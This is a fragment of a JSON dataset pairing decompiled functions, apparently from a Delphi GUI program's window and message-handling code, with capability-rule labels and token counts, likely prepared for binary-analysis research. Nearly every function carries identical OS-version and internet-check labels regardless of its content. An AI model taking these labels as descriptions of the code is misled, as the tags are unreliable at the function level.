        "decompiled_code": "\nvoid fcn.00457b10(void)\n\n{\n    int32_t in_EAX;\n    \n    for (; (in_EAX != 0 && (*(in_EAX + 0x99) == '\\0')); in_EAX = *(in_EAX + 0x30)) {\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "00457b30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00457b30(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    if (*0x463bb0 != 0) {\n        uStack24 = 0x457b61;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack28;\n        fcn.00459f7c();\n        *in_FS_OFFSET = uStack28;\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "00457b84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00457b84(void)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    \n    *0x463bc0 = sub.kernel32.dll_GetCurrentThreadId_1();\n    while( true ) {\n        iVar1 = sub.kernel32.dll_WaitForSingleObject();\n        if (iVar1 != 0x102) break;\n        if (*0x463bb0 != 0) {\n            if (*(*0x463bb0 + 0x60) != 0) {\n                sub.user32.dll_GetCursorPos();\n                iVar1 = fcn.00437da4();\n                if (iVar1 == 0) {\n                    fcn.00459ff8();\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "00457be0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00457be0(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_CallNextHookEx(*0x463bc8, arg_8h, arg_ch, arg_10h);\n    if ((-1 < arg_8h) && (*0x463bb0 != 0)) {\n        fcn.00459098();\n    }\n    return uVar1;\n}\n",
        "token_count": 110
    },
    "00457c24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00457c24(void)\n\n{\n    uint uStack20;\n    code *pcStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    if (*(*0x463bb0 + 0xa5) == '\\0') {\n        if (*0x463bc8 == 0) {\n            uStack8 = 0x457c41;\n            uStack8 = sub.kernel32.dll_GetCurrentThreadId_1();\n            uStack12 = 0;\n            pcStack16 = fcn.00457be0;\n            uStack20 = 3;\n            *0x463bc8 = sub.user32.dll_SetWindowsHookExA();\n        }\n        if (*0x463bc4 == 0) {\n            *0x463bc4 = sub.kernel32.dll_CreateEventA(0, 0, 0, 0);\n        }\n        if (*0x463bcc == 0) {\n            *0x463bcc = sub.kernel32.dll_CreateThread(0, 1000, fcn.00457b84, 0, 0, &stack0xffffffec);\n        }\n    }\n    return;\n}\n",
        "token_count": 249
    },
    "00457c98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "set application hook"
        ],
        "decompiled_code": "\nvoid fcn.00457c98(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x463bc8 != 0) {\n        sub.user32.dll_UnhookWindowsHookEx(*0x463bc8);\n    }\n    *0x463bc8 = 0;\n    if (*0x463bcc != 0) {\n        sub.kernel32.dll_SetEvent(*0x463bc4);\n        iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n        if (iVar1 != *0x463bc0) {\n            sub.kernel32.dll_WaitForSingleObject(*0x463bcc, 0xffffffff);\n        }\n        sub.kernel32.dll_CloseHandle(*0x463bcc);\n        *0x463bcc = 0;\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "00457cf4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint64_t fcn.00457cf4(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint auStack8 [2];\n    \n    auStack8[0] = 8;\n    uVar2 = 8;\n    uVar1 = sub.user32.dll_SystemParametersInfoA(0x48, 8, auStack8, 0);\n    if (uVar1 != 0) {\n        return CONCAT44(uVar2, uVar1 & 0xffffff00 | uVar2 != 0);\n    }\n    return uVar2 << 0x20;\n}\n",
        "token_count": 135
    },
    "00457d8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\ncode * __fastcall fcn.00457d8c(uint param_1, char param_2)\n\n{\n    code **ppcVar1;\n    code *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    uint lpFilename;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    var_1h._0_1_ = param_2;\n    fcn.0041951c();\n    ppcVar1 = *0x462008;\n    if (*(*0x462008 + 2) == 0) {\n        (*0x462008)[1] = in_EAX;\n        *ppcVar1 = fcn.00459464;\n    }\n    ppcVar1 = *0x4620b4;\n    if (*(*0x4620b4 + 2) == 0) {\n        (*0x4620b4)[1] = in_EAX;\n        *ppcVar1 = fcn.0045965c;\n    }\n    in_EAX[0x34] = 0x0;\n    uVar2 = fcn.00403228();\n    *(in_EAX + 0x90) = uVar2;\n    uVar2 = fcn.00403228();\n    *(in_EAX + 0xa8) = uVar2;\n    *(in_EAX + 0x60) = 0;\n    *(in_EAX + 0x84) = 0;\n    *(in_EAX + 0x5c) = 0xff000018;\n    *(in_EAX + 0x78) = 500;\n    in_EAX[0x7c] = 0x1;\n    *(in_EAX + 0x80) = 0;\n    *(in_EAX + 0x74) = 0x9c4;\n    in_EAX[0x88] = 0x0;\n    in_EAX[0x9d] = 0x1;\n    in_EAX[0xb4] = 0x1;\n    uVar2 = fcn.004232c4();\n    *(in_EAX + 0x98) = uVar2;\n    sub.user32.dll_LoadIconA(**0x461f28, 0x457f6c);\n    fcn.00423694();\n    iVar3 = *(in_EAX + 0x98);\n    *(iVar3 + 0x14) = in_EAX;\n    *(iVar3 + 0x10) = 0x459bfc;\n    sub.kernel32.dll_GetModuleFileNameA_1(**0x461f28, &lpFilename, 0x100);\n    sub.user32.dll_OemToCharA(&lpFilename, &lpFilename);\n    iVar3 = fcn.0040c378();\n    if (iVar3 != 0) {\n        fcn.00408618();\n    }\n    puVar4 = fcn.0040c3a0();\n    if (puVar4 != NULL) {\n        *puVar4 = 0;\n    }\n    sub.user32.dll_CharLowerA();\n    fcn.00404218();\n    if (**0x461e10 == '\\0') {\n        fcn.00458094();\n    }\n    in_EAX[0x59] = 0x1;\n    in_EAX[0x5a] = 0x1;\n    in_EAX[0x5b] = 0x1;\n    in_EAX[0x9e] = 0x1;\n    *(in_EAX + 0xa0) = 0;\n    fcn.00459dd8();\n    fcn.0045a79c();\n    if (var_1h != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = &lpFilename + 1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 928
    },
    "00458094": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00458094(void)\n\n{\n    int16_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_00000030;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_2ch;\n    uint lpWndClass;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x458235;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    if ((*(in_EAX + 0xa4) == '\\0') && (**0x4620fc == '\\0')) {\n        uVar2 = fcn.0041a5ac(fcn.00458614, in_EAX);\n        *(in_EAX + 0x40) = uVar2;\n        *0x461dc0 = sub.user32.dll_DefWindowProcA;\n        iVar3 = sub.user32.dll_GetClassInfoA(*0x463664, *0x461de0, &fcn.00458094::lpWndClass);\n        if (iVar3 == 0) {\n            *0x461dcc = *0x463664;\n            iVar1 = sub.user32.dll_RegisterClassA(0x461dbc);\n            if (iVar1 == 0) {\n                fcn.00405b0c();\n                fcn.0040b538();\n                fcn.004039e4();\n            }\n        }\n        uVar4 = (***0x461f44)(0);\n        iVar3 = uVar4 >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((uVar4 & 1) != 0);\n        }\n        uVar4 = (***0x461f44)(1, iVar3);\n        uVar2 = *0x463664;\n        iVar3 = uVar4 >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((uVar4 & 1) != 0);\n        }\n        fcn.00404468();\n        uVar2 = fcn.004069f4(0, uVar2, 0, 0, 0, 0, iVar3, in_stack_00000030);\n        *(in_EAX + 0x30) = uVar2;\n        fcn.00403fa8();\n        *(in_EAX + 0xa4) = 1;\n        uStack20 = *(in_EAX + 0x30);\n        sub.user32.dll_SetWindowLongA();\n        if (**0x461fc0 != '\\0') {\n            fcn.00458d18();\n            uStack8 = *(in_EAX + 0x30);\n            uStack12 = 0x4581ce;\n            sub.user32.dll_SendMessageA();\n            uStack12 = 0x4581d5;\n            uStack12 = fcn.00458d18();\n            uStack16 = 0xfffffff2;\n            uStack20 = *(in_EAX + 0x30);\n            uStack24 = 0x4581e1;\n            sub.user32.dll_SetClassLongA();\n        }\n        uStack24 = 0;\n        uStack28 = *(in_EAX + 0x30);\n        uStack32 = 0x4581ec;\n        uVar2 = sub.user32.dll_GetSystemMenu();\n        uStack32 = 0;\n        uStack36 = 0xf030;\n        lpWndClass = 0x4581fb;\n        uStack40 = uVar2;\n        sub.user32.dll_DeleteMenu();\n        lpWndClass = 0;\n        puStack56 = 0x458208;\n        uStack64 = uVar2;\n        sub.user32.dll_DeleteMenu();\n        if (**0x461fc0 != '\\0') {\n            puStack56 = NULL;\n            uStack60 = 0xf010;\n            uStack64 = uVar2;\n            sub.user32.dll_DeleteMenu();\n        }\n    }\n    *in_FS_OFFSET = uStack64;\n    puStack56 = 0x45823c;\n    uStack60 = 0x458234;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 1004
    },
    "004582a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004582a4(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    uVar3 = 0xffffffff;\n    iVar1 = func_0x0040667c(arg_8h, 4);\n    if (iVar1 == *(*0x463bb0 + 0x30)) {\n        uVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xffffffec);\n        if (((uVar2 & 8) == 0) ||\n           (((*(*0x463bb0 + 0x44) != 0 && (*(arg_ch + 1) == '\\0')) && (iVar1 = fcn.0043fd08(),  arg_8h == iVar1)))) {\n            *arg_ch = arg_8h;\n            uVar3 = 0;\n        }\n        else {\n            fcn.00413a08();\n        }\n        return uVar3;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 237
    },
    "00458314": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00458314(uint param_1, uchar param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint uStack16;\n    uchar uStack12;\n    \n    if (*(*0x463bb0 + 0x30) != 0) {\n        if (*(in_EAX + 0x94) == 0) {\n            uStack16 = *(in_EAX + 0x30);\n            pcVar4 = fcn.004582a4;\n            uStack12 = param_2;\n            sub.user32.dll_EnumWindows(fcn.004582a4, &uStack16);\n            if (*(*(in_EAX + 0x90) + 8) != 0) {\n                uVar1 = func_0x0040667c(pcVar4, 3);\n                uVar2 = sub.user32.dll_GetWindowLongA(uVar1, 0xffffffec, uVar1);\n                if ((uVar2 & 8) != 0) {\n                    uVar1 = 0xfffffffe;\n                }\n                iVar3 = *(*(in_EAX + 0x90) + 8) + -1;\n                if (-1 < iVar3) {\n                    do {\n                        uVar1 = fcn.00413b64(uVar1, 0, 0, 0, 0, 0x213);\n                        sub.user32.dll_SetWindowPos();\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != -1);\n                }\n            }\n        }\n        *(in_EAX + 0x94) = *(in_EAX + 0x94) + 1;\n    }\n    return;\n}\n",
        "token_count": 395
    },
    "004583c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004583c4(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0xb8) = *(in_EAX + 0xb8) + 1;\n    if ((*(in_EAX + 0xb8) == 1) && (*(in_EAX + 0xe2) != 0)) {\n        (**(in_EAX + 0xe0))();\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "004583f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004583f0(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0xb8) = *(in_EAX + 0xb8) + -1;\n    if ((*(in_EAX + 0xb8) == 0) && (*(in_EAX + 0xea) != 0)) {\n        (**(in_EAX + 0xe8))();\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "0045842c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0045842c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (((*(*0x463bb0 + 0x30) != 0) && (0 < *(in_EAX + 0x94))) &&\n       (*(in_EAX + 0x94) = *(in_EAX + 0x94) + -1,  *(in_EAX + 0x94) == 0)) {\n        iVar1 = *(*(in_EAX + 0x90) + 8) + -1;\n        if (-1 < iVar1) {\n            do {\n                fcn.00413b64(0xffffffff, 0, 0, 0, 0, 0x213);\n                sub.user32.dll_SetWindowPos();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        (**(**(in_EAX + 0x90) + 8))();\n    }\n    return;\n}\n",
        "token_count": 224
    },
    "00458498": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00458498(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x462210 + 0xd) != '\\0') && (*(in_EAX + 0x34) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 66
    },
    "004584c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004584c8(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*param_2 == *0x463bbc) || (*param_2 == 0x1a)) {\n        if (*(in_EAX + 0x59) != '\\0') {\n            sub.kernel32.dll_SetThreadLocale(0x400);\n            fcn.0040c640();\n        }\n        if (*(in_EAX + 0x5a) != '\\0') {\n            fcn.00457484();\n        }\n        if (*param_2 == *0x463bbc) {\n            fcn.00457acc();\n        }\n    }\n    return 0;\n}\n",
        "token_count": 161
    },
    "00458520": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00458520(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x45857d;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(in_EAX + 0x13a) != 0) {\n        fcn.004041a0();\n        (**(in_EAX + 0x138))(param_2 + 0xc, 0);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x458584;\n    uStack24 = 0x45857c;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 209
    },
    "00458614": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00458614(uint param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    code **ppcVar3;\n    code *pcVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x458cce;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    param_2[3] = 0;\n    iVar8 = *(*(in_EAX + 0xa8) + 8);\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar8 + -1) {\n        do {\n            puStack28 = puVar1;\n            ppcVar3 = fcn.00413b64();\n            cVar2 = (**ppcVar3)();\n            if (cVar2 != '\\0') {\n                *in_FS_OFFSET = uStack36;\n                return;\n            }\n            iVar8 = iVar8 + -1;\n            puVar1 = puStack28;\n        } while (iVar8 != 0);\n    }\n    fcn.004584c8();\n    iVar8 = *param_2;\n    if (0x53 < iVar8) {\n        if (iVar8 < 0xb018) {\n            if (iVar8 == 0xb017) {\n                if ((*(in_EAX + 0x44) != 0) && (iVar8 = fcn.0043fd08(),  iVar8 != 0)) {\n                    uVar6 = fcn.0043fd08();\n                    iVar8 = sub.user32.dll_IsWindowEnabled(uVar6);\n                    if (iVar8 != 0) {\n                        uVar6 = fcn.0043fd08();\n                        iVar8 = sub.user32.dll_IsWindowVisible(uVar6);\n                        if (iVar8 != 0) {\n                            *0x461cd8 = 0;\n                            uVar6 = sub.user32.dll_GetFocus();\n                            uVar7 = fcn.0043fd08();\n                            sub.user32.dll_SetFocus(uVar7);\n                            fcn.0043a6d4(param_2[2]);\n                            sub.user32.dll_SetFocus(uVar6);\n                            *0x461cd8 = 1;\n                            param_2[3] = 1;\n                        }\n                    }\n                }\n                goto code_r0x00458cc4;\n            }\n            if (iVar8 < 0xb001) {\n                if (iVar8 == 0xb000) {\n                    if (*(in_EAX + 0x112) != 0) {\n                        (**(in_EAX + 0x110))();\n                    }\n                    goto code_r0x00458cc4;\n                }\n                if (iVar8 == 0x112) {\n                    if ((param_2[1] & 0xfff0U) == 0xf020) {\n                        fcn.00458d34();\n                    }\n                    else if ((param_2[1] & 0xfff0U) == 0xf120) {\n                        fcn.00458de4();\n                    }\n                    else {\n                        fcn.0045858c(&stack0xfffffffc);\n                    }\n                    goto code_r0x00458cc4;\n                }\n                if (iVar8 - 0x132U < 7) {\n                    iVar8 = sub.user32.dll_SendMessageA(param_2[2], iVar8 + 0xbc00, param_2[1], param_2[2]);\n                    param_2[3] = iVar8;\n                    goto code_r0x00458cc4;\n                }\n                if (iVar8 - 0x132U == 0x1e8) {\n                    fcn.0042f140();\n                    cVar2 = fcn.0042f220();\n                    if (cVar2 != '\\0') {\n                        fcn.0042f140();\n                        fcn.0042f27c();\n                    }\n                    goto code_r0x00458cc4;\n                }\n            }\n            else {\n                if (iVar8 == 0xb001) {\n                    if (*(in_EAX + 0x10a) != 0) {\n                        (**(in_EAX + 0x108))();\n                    }\n                    goto code_r0x00458cc4;\n                }\n                if (iVar8 == 0xb016) {\n                    cVar2 = fcn.004590cc();\n                    if (cVar2 != '\\0') {\n                        param_2[3] = 1;\n                    }\n                    goto code_r0x00458cc4;\n                }\n            }\n        }\n        else if (iVar8 < 0xb021) {\n            if (iVar8 == 0xb020) {\n                if (param_2[1] == 0) {\n                    fcn.004591f4(*param_2[2], param_2[2][1]);\n                }\n                else {\n                    fcn.00459250(*param_2[2], param_2[2][1]);\n                }\n                goto code_r0x00458cc4;\n            }\n            if (iVar8 == 0xb01a) {\n                iVar8 = sub.user32.dll_IsIconic(*(in_EAX + 0x30));\n                if (((iVar8 == 0) && (iVar8 = sub.user32.dll_GetFocus(),  iVar8 == *(in_EAX + 0x30))) &&\n                   (iVar8 = fcn.0045044c(),  iVar8 != 0)) {\n                    sub.user32.dll_SetFocus(iVar8);\n                }\n                goto code_r0x00458cc4;\n            }\n            if (iVar8 == 0xb01f) goto code_r0x00458be3;\n        }\n        else {\n            if (iVar8 == 0xb031) {\n                if (param_2[1] == 1) {\n                    param_2[3] = *(in_EAX + 0xb0);\n                }\n                else {\n                    *(in_EAX + 0xb0) = param_2[2];\n                }\n                goto code_r0x00458cc4;\n            }\n            if (iVar8 - 0xb03fU < 2) {\n                uVar5 = fcn.0045a660();\n                param_2[3] = uVar5 & 0x7f;\n                goto code_r0x00458cc4;\n            }\n        }\n        goto code_r0x00458cbd;\n    }\n    if (iVar8 == 0x53) {\ncode_r0x00458be3:\n        fcn.00459734();\n        goto code_r0x00458cc4;\n    }\n    if (iVar8 < 0x17) {\n    // switch table (21 cases) at 0x4586b8\n        switch(iVar8) {\n        case 0:\n            fcn.0041937c();\n            break;\n        case 1:\n        case 2:\n        case 3:\n        case 4:\n        case 5:\n        case 6:\n        case 8:\n        case 9:\n        case 0xb:\n        case 0xc:\n        case 0xd:\n        case 0xe:\n        case 0x11:\n        case 0x12:\n        case 0x13:\n            goto code_r0x00458cbd;\n        case 7:\n            sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb01a, 0, 0);\n            fcn.0045858c(&stack0xfffffffc);\n            break;\n        case 10:\n            if (param_2[1] == 0) {\n                fcn.0045858c(&stack0xfffffffc);\n                if (*(in_EAX + 0xac) == 0) {\n                    uVar6 = fcn.004502fc();\n                    *(in_EAX + 0xac) = uVar6;\n                }\n                fcn.00458424();\n            }\n            else {\n                fcn.0045842c();\n                if (*(in_EAX + 0xac) != 0) {\n                    fcn.004503b0();\n                    *(in_EAX + 0xac) = 0;\n                }\n                fcn.0045858c(&stack0xfffffffc);\n            }\n            break;\n        case 0xf:\n            iVar8 = sub.user32.dll_IsIconic(*(in_EAX + 0x30));\n            if (iVar8 == 0) {\n                fcn.0045858c(&stack0xfffffffc);\n            }\n            else {\n                fcn.004585c8(&stack0xfffffffc);\n            }\n            break;\n        case 0x10:\n            if (*(in_EAX + 0x44) != 0) {\n                fcn.00455ccc();\n            }\n            break;\n        case 0x14:\n            *param_2 = 0x27;\n            fcn.0045858c(&stack0xfffffffc);\n            break;\n        default:\n            if (param_2[1] != 0) {\n                *(in_EAX + 0x9c) = 1;\n            }\n        }\n    }\n    else {\n        if (iVar8 < 0x1e) {\n            if (iVar8 == 0x1d) {\n                fcn.00457acc();\n                fcn.0045858c(&stack0xfffffffc);\n                goto code_r0x00458cc4;\n            }\n            if (iVar8 == 0x1a) {\n                fcn.00444610();\n                fcn.00458520();\n                fcn.0045858c(&stack0xfffffffc);\n                goto code_r0x00458cc4;\n            }\n            if (iVar8 == 0x1c) {\n                fcn.0045858c(&stack0xfffffffc);\n                *(in_EAX + 0x9d) = '\\x01' - (param_2[1] == 0);\n                if (param_2[1] == 0) {\n                    fcn.0045841c();\n                    sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb001, 0, 0);\n                }\n                else {\n                    fcn.0045842c();\n                    sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb000, 0, 0);\n                }\n                goto code_r0x00458cc4;\n            }\n        }\n        else {\n            if (iVar8 == 0x37) {\n                iVar8 = fcn.00458d18();\n                param_2[3] = iVar8;\n                goto code_r0x00458cc4;\n            }\n            if (iVar8 == 0x4a) {\n                if ((*param_2[2] == -0x21acbbac) && (*(in_EAX + 0x9e) != '\\0')) {\n                    if (*(in_EAX + 0xa0) == 0) {\n                        iVar8 = fcn.0040cfe8();\n                        *(in_EAX + 0xa0) = iVar8;\n                        if (iVar8 == 0) {\n                            iVar8 = sub.kernel32.dll_GetLastError();\n                            param_2[3] = iVar8;\n                            *(in_EAX + 0xa0) = 0;\n                        }\n                        else {\n                            param_2[3] = 0;\n                            pcVar4 = sub.kernel32.dll_GetProcAddress_1(*(in_EAX + 0xa0), 0x458d04);\n                            if (pcVar4 != NULL) {\n                                (*pcVar4)(*(param_2[2] + 4), *(param_2[2] + 8));\n                            }\n                        }\n                    }\n                    else {\n                        param_2[3] = 0;\n                    }\n                }\n                goto code_r0x00458cc4;\n            }\n        }\ncode_r0x00458cbd:\n        fcn.0045858c(&stack0xfffffffc);\n    }\ncode_r0x00458cc4:\n    *in_FS_OFFSET = uStack36;\n    return;\n}\n",
        "token_count": 2716
    },
    "00458d34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00458d34(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = sub.user32.dll_IsIconic(*(in_EAX + 0x30));\n    if (iVar1 != 0) {\n        return;\n    }\n    fcn.0045841c();\n    sub.user32.dll_SetActiveWindow(*(in_EAX + 0x30));\n    if ((*(in_EAX + 0x44) != 0) && ((*(in_EAX + 0x5b) != '\\0' || (*(*(in_EAX + 0x44) + 0x57) != '\\0')))) {\n        uVar2 = fcn.0043fd08();\n        iVar1 = sub.user32.dll_IsWindowEnabled(uVar2);\n        if (iVar1 != 0) {\n            iVar1 = *(in_EAX + 0x44);\n            uVar2 = fcn.0043fd08(*(iVar1 + 0x40), *(iVar1 + 0x44), *(iVar1 + 0x48), 0, 0x40);\n            sub.user32.dll_SetWindowPos(*(in_EAX + 0x30), uVar2);\n            sub.user32.dll_DefWindowProcA(*(in_EAX + 0x30), 0x112, 0xf020, 0);\n            goto code_r0x00458dc9;\n        }\n    }\n    fcn.00457d4c();\ncode_r0x00458dc9:\n    if (*(in_EAX + 0x11a) != 0) {\n        (**(in_EAX + 0x118))();\n    }\n    return;\n}\n",
        "token_count": 379
    },
    "00458de4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
